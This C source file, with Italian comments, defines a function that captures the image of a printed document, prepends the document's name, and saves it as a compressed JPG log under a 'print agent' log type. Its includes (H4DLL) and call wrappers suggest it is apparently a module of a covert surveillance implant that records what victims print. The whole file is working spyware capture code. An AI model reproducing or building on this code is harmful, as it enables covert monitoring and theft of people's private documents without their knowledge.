#include <Windows.h>

// Funzione esportata per permettere di loggare una bitmap 
#include "../../H4DLL/common.h"
#include "../../H4DLL/HM_BitmapCommon.h"

typedef struct _PrintAdditionalData {
	UINT uVersion;
#define LOG_PRINT_VERSION 2009031201
	UINT uDocumentNameLen;
} PrintAdditionalData;

void Log_PrintDC(WCHAR* doc_name, HDC print_dc, HBITMAP print_bmp, DWORD x_dim, DWORD y_dim)
{
	BITMAPINFOHEADER bmiHeader;
	DWORD* pdwFullBits = NULL;
	HDC safe_dc, g_hScrDC;
	HBITMAP safe_bmp;
	PrintAdditionalData* print_additional_header;
	BYTE* log_header;
	DWORD additional_len;

	// Crea un DC e una bitmap compatibili con lo schermo 
	if (!(g_hScrDC = CreateDC("DISPLAY", NULL, NULL, NULL)))
		return;
	safe_dc = CreateCompatibleDC(NULL);
	safe_bmp = CreateCompatibleBitmap(g_hScrDC, x_dim, y_dim);
	DeleteDC(g_hScrDC);
	SelectObject(safe_dc, safe_bmp);

	// Alloca la bitmap di dimensione sicuramente superiore a quanto sara' 
	if (!(pdwFullBits = (DWORD*)malloc(x_dim * y_dim * sizeof(DWORD))))
		return;

	// Copia il print_memory_dc nel dc compatibile con lo schermo
	// per l'acquisizione in bitmap
	//BitBlt(safe_dc, 0, 0, x_dim, y_dim, print_dc, 0, 0, SRCCOPY);
	// Settaggi per il capture dello screen
	ZeroMemory(&bmiHeader, sizeof(BITMAPINFOHEADER));
	bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmiHeader.biWidth = x_dim;
	bmiHeader.biHeight = y_dim;
	bmiHeader.biPlanes = 1;
	bmiHeader.biBitCount = 24;
	bmiHeader.biCompression = BI_RGB;

	FNC(GetDIBits)(print_dc, print_bmp, 0, y_dim, pdwFullBits, (BITMAPINFO*)&bmiHeader, DIB_RGB_COLORS);
	SetDIBits(safe_dc, safe_bmp, 0, y_dim, pdwFullBits, (BITMAPINFO*)&bmiHeader, DIB_RGB_COLORS);

	bmiHeader.biBitCount = 16;
	bmiHeader.biSizeImage = bmiHeader.biWidth * bmiHeader.biHeight * (bmiHeader.biBitCount / 8);

	// Prende il contenuto del DC
	if (FNC(GetDIBits)(safe_dc, safe_bmp, 0, y_dim, pdwFullBits, (BITMAPINFO*)&bmiHeader, DIB_RGB_COLORS)) {
		additional_len = sizeof(PrintAdditionalData) + wcslen(doc_name) * sizeof(WCHAR);
		log_header = (BYTE*)malloc(additional_len);
		if (log_header) {
			// Crea l'header addizionale
			print_additional_header = (PrintAdditionalData*)log_header;
			print_additional_header->uVersion = LOG_PRINT_VERSION;
			print_additional_header->uDocumentNameLen = wcslen(doc_name) * sizeof(WCHAR);
			log_header += sizeof(PrintAdditionalData);
			memcpy(log_header, doc_name, print_additional_header->uDocumentNameLen);

			//Output su file
			BmpToJpgLog(PM_PRINTAGENT, (BYTE*)print_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE*)pdwFullBits, bmiHeader.biSizeImage, 50);
			SAFE_FREE(print_additional_header);
		}
	}

	// Rilascio oggetti....
	if (safe_bmp) DeleteObject(safe_bmp);
	if (safe_dc) DeleteDC(safe_dc);
	SAFE_FREE(pdwFullBits);
}
